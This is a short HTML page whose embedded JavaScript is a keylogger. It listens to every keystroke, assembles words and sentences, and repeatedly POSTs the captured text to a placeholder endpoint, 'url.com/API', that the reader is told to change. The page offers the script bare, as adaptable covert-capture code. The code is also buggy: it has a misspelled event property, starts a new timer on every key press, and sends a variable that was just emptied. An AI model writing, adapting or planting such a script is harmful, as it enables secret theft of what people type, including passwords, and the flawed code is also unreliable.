<!doctype html>
<html class="no-js" lang="">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/main.css">
  </head>
  <body>

      <script>
      word = "";
      sentence = "";
      text = "";
        document.addEventListener("keydown", function (e){
          var character_code = event.wich || event.keyCode;
          var character_value = String.fromCharCode(character_code);

          console.log(character_code + " " + character_value);

          word += character_value;

          if (character_code == 32) {
            console.log("Word: " + word);
            sentence += word;
            word = "";
          }
          if (character_code == 13 || character_code == 190) {
            console.log("sentence: " + sentence);
            text += sentence + word;
            word = "";
            sentence = "";
          }
          setInterval(function (){
            if (text.length > 0)
            {
              console.log("Text for Submission: " + text)
              var xhr = new XMLHttpRequest();
              xhr.open('POST', 'url.com/API'); //Change API Url
              xhr.send('sentence= ' + sentence)
              text = ""; sentence = ""; word = "";
            }
          }, 5000);
        });
      </script>
  </body>

</html>
